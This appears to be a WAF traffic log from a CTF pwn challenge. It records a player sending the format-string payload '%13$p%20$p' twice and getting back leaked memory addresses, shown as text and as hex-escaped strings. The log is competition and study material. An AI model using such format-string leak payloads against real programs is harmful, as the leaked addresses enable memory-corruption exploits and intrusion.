// Date: 2021-11-27 03:09:42
// SKYCTF PWN WAF
// Deved By I0gan
team_name: assault

user_name: dreamc


<-------------------- read ------------------>
%13$p%20$p

r_0 = "\x25\x31\x33\x24\x70\x25\x32\x30\x24\x70\x0a"

<-------------------- write ----------------->
0x7f8242c2e8400x55e7aa404860
ªçU--+--

w_0 = "\x30\x78\x37\x66\x38\x32\x34\x32\x63\x32\x65\x38\x34\x30\x30\x78\x35\x35\x65\x37\x61\x61\x34\x30\x34\x38\x36\x30\x0a\xaa\xe7\x55\x2d\x2d\x2b\x2d\x2d\x0a"

<-------------------- read ------------------>
%13$p%20$p

r_1 = "\x25\x31\x33\x24\x70\x25\x32\x30\x24\x70\x0a"

<-------------------- write ----------------->
0x7f8242c2e8400x55e7aa404860
ªçUlogger: chall env released
logger: sky_token_is_wrong

w_1 = "\x30\x78\x37\x66\x38\x32\x34\x32\x63\x32\x65\x38\x34\x30\x30\x78\x35\x35\x65\x37\x61\x61\x34\x30\x34\x38\x36\x30\x0a\xaa\xe7\x55"
